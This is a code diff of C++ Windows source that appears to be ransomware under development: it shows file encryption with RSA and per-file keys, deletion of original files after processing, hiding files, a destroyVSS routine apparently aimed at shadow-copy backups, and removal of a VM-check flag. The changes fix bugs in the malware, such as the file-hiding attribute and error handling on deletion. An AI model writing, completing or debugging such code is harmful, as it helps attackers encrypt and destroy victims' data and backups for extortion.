@@ -5,7 +5,6 @@
 
 #define LIMIT_CPU_FAIL 0
 
-#define VM 0
 
 using namespace boost::filesystem;
 using std::string;
@@ -19,6 +18,7 @@ static DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HA
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 void changeHiddenFileState(bool state);
 void destroyVSS();
+
 static void iterate(const path& parent,
 	RsaEncryptor& rsaEncryptor,
 	std::vector<string>& processedPaths);
@@ -195,9 +195,8 @@ CLEAN:
 void makeFileHidden(string path)
 {
 	DWORD attributes = GetFileAttributes(path.c_str());
-	SetFileAttributes(path.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
+	SetFileAttributes(path.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN);
 }
-
 
 void changeHiddenFileState(bool state)
 {
@@ -348,9 +347,9 @@ Status encrypt(string path, RsaEncryptor& encryptor)
 	if (!NT_SUCCESS(status)) {
 		goto CLEANUP;
 	}
-#ifdef DEBUG
-	std::cout << "Ciphertext:\t" << cipherText << std::endl;
-#endif
+
+	//std::cout << "Ciphertext:\t" << cipherText << std::endl; //DEBUG
+
 
 	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
 	if (keyIV == nullptr)
@@ -523,6 +522,7 @@ static void iterate(const path& parent,
 
 	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
 		path = itr->path().string();
+		//std::cout << "handling " << path << std::endl;//DEBUG PRINT
 		string ending(path.begin()+path.size()-3, path.end());
 		bool lnkFile =false;
 
@@ -555,10 +555,12 @@ static void iterate(const path& parent,
 			sumSize += file_size(path);
 			if (processedPaths.size() > COUNT_THRESHOLD || sumSize >= SIZE_THRESHOLD)
 			{
+				boost::system::error_code ec;
 				for (auto& fileToDelete : processedPaths)
 				{
-					remove(fileToDelete);
+					remove(fileToDelete, ec);
 				}
+				//TODO handle unsuccessful remove
 				sumSize = 0;
 				processedPaths.clear();
 			}
